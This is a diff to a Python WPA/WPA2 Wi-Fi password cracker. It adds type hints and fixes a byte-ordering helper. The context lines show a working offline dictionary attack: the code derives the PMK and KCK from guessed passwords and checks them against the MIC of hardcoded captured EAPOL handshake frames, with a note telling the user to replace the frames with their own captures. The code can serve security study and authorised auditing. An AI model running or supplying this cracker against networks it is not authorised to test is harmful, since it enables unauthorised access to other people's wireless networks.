@@ -5,7 +5,7 @@ from os import process_cpu_count, _exit
 import threading
 
 
-def crack_wpa_p(message, eapol_frame_zeroed_mic, mic, ssid_bytes, password_guess, time_start):
+def crack_wpa_p(message, eapol_frame_zeroed_mic, mic, ssid_bytes, password_guess, time_start) -> None:
     pmk = hashlib.pbkdf2_hmac("sha1", password_guess, ssid_bytes, 4096, 32)
     kck = hmac.digest(pmk, message + b"\0", hashlib.sha1)[:16]
     if hmac.compare_digest(mic, hmac.digest(kck, eapol_frame_zeroed_mic, hashlib.sha1)[:16]):
@@ -14,7 +14,7 @@ def crack_wpa_p(message, eapol_frame_zeroed_mic, mic, ssid_bytes, password_guess
         _exit(0)
 
 
-def worker(list_passwords_guess, time_start):
+def worker(list_passwords_guess, time_start) -> None:
     # Replace with your own values
     FRAME_1 = bytes.fromhex("88023a019cb6d0fc90c77c8bcacbd7827c8bcacbd78200000000aaaa03000000888e0103005f02008a001000000000000000011a8b4e106c75287aa6d52dbc8342306e2f4f77e3826556a482bcd5f72c97e0f60000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
     FRAME_2 = bytes.fromhex("88013a017c8bcacbd7829cb6d0fc90c77c8bcacbd78200000600aaaa03000000888e0103007502010a0000000000000000000103864225e34350a84df0061bb6ae60da4c0600879d50ec1ea4f47ee29da4b5da0000000000000000000000000000000000000000000000000000000000000000584c33e052eb53dd19001a339b42eefe001630140100000fac040100000fac040100000fac020000")
@@ -31,17 +31,18 @@ def worker(list_passwords_guess, time_start):
     ap_nonce = FRAME_1[51:83]
     sta_nonce = FRAME_2[51:83]
 
-    def sort(in_1, in_2):
+    def sort_high_low(in_1, in_2) -> tuple:
         in_1_byte_list = list(bytes(in_1))
         in_2_byte_list = list(bytes(in_2))
         for i in range(0, len(in_1_byte_list)):
             if in_1_byte_list[i] < in_2_byte_list[i]:
                 return (in_2, in_1)
-            else:
+            elif in_1_byte_list[i] > in_2_byte_list[i]:
                 return (in_1, in_2)
+        raise ValueError('Same value!')
 
-    max_mac, min_mac = sort(ap_mac, sta_mac)
-    max_nonce, min_nonce = sort(ap_nonce, sta_nonce)
+    max_mac, min_mac = sort_high_low(ap_mac, sta_mac)
+    max_nonce, min_nonce = sort_high_low(ap_nonce, sta_nonce)
     message = b"".join([b"Pairwise key expansion\x00", min_mac, max_mac, min_nonce, max_nonce])
     packet = FRAME_2
     frame_ctl = packet[0:2]
